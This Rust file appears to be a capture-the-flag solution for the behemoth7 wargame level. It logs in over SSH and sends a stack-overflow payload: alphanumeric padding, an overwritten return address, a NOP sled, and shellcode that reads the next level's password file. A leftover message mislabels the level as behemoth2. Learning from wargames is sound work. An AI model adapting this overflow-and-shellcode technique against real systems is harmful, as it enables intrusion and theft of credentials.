use crate::util::*;
use anyhow::Result;

/// behemoth7 was like behemoth1 (at least, my solution was very similar)
/// differences were the length was 528 to the ret address, and nothing in that buffer could be non-alphanumeric
/// the ret address itself and the stack after it could be whatever though, so just moved things about a bit
pub fn solve(password: &str) -> Result<String> {
    let session = ssh_session(super::HOST, super::PORT, "behemoth7", password)?;
    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "$ ")?;

    let prefix: Vec<u8> = vec![0x41; 528];
    let var_adr = hex_decode("a0d2ffff")?; // 0xffffd35c, approximate location in nop sled
    let nop_sled: Vec<u8> = vec![0x90; 64];
    let file_read_shellcode = hex_decode(super::READ_FILE_SHELLCODE).unwrap();
    let file_to_read = "/etc/behemoth_pass/behemoth8".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here

    let mut full_payload: Vec<u8> = Vec::new();
    full_payload.extend(prefix);
    full_payload.extend(var_adr);
    full_payload.extend(nop_sled);
    full_payload.extend(file_read_shellcode);
    full_payload.extend(file_to_read);

    let encoded = hex_encode(&full_payload);

    let target = "/behemoth/behemoth7";
    println!("running '{target} $(echo -en [payload])'");

    let cmd = format!("{target} $(echo -en \"{encoded}\")");
    write_line(&mut channel, &cmd)?;

    println!("reading result");
    let result = read_until(&mut channel, "$ ")?;
    let result = result
        .split(['\r', '\n'])
        .map(|s| s.trim())
        .find(|s| s.len() == 10)
        .unwrap();
    println!("retrieved behemoth2 pass '{result}'\n");

    Ok(result.to_string())
}
